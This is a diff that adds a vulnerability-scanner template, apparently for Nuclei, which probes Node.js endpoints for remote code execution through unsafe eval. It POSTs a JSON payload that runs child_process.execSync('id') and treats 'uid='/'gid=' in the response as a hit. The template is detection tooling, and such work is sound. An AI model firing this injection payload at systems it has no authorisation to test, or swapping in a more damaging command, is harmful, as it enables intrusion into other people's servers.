@@ -1,0 +1,36 @@
+id: nodejs-eval-rce
+info:
+  name: Node.js Unsafe Eval - Remote Code Execution
+  author: grok-generated
+  severity: critical
+  description: Detects Node.js applications vulnerable to RCE due to unsafe use of eval or similar functions in exposed endpoints.
+  reference:
+    - https://nodejs.org/en/docs/guides/security#avoid-unsafe-use-of-eval
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: nodejs, rce, eval, misconfiguration
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/eval"
+      - "{{BaseURL}}/api/execute"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+      Content-Type: application/json
+    body: |
+      {"code": "require('child_process').execSync('id').toString()"}
+      
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        part: body
+        condition: and
